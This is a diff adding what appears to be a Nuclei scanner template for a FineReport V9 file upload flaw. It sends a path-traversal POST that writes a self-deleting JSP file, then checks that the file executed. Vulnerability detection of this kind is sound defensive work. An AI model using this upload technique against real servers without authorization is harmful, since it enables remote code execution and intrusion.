@@ -1,0 +1,42 @@
+id: fanruan-finereport-file_upload-cnvd-2021-34467
+info:
+  name: Fanruan FineReport File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Exploits a file upload vulnerability in Fanruan FineReport V9 that allows uploading and executing arbitrary JSP files.
+    This vulnerability can lead to remote code execution.
+  reference:
+    - https://github.com/YinWC/2021hvv_vul/blob/master/0408/%E5%B8%86%E8%BD%AF%20V9getshell%20FineReport%20V9.md
+
+variables:
+  rand: "{{md5(rand_text_alphanumeric(20))}}"
+  rFilename: "{{rand_text_alphanumeric(6)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/{{rFilename}}.svg.jsp"
+    headers:
+      Content-Type: text/xml;charset=UTF-8
+    body: |
+      {"__CONTENT__":"<%out.println(\"{{rand}}\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>","__CHARSET__":"UTF-8"}
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-file
+    method: GET
+    path:
+      - "{{BaseURL}}/WebReport/{{rFilename}}.svg.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{rand}}"
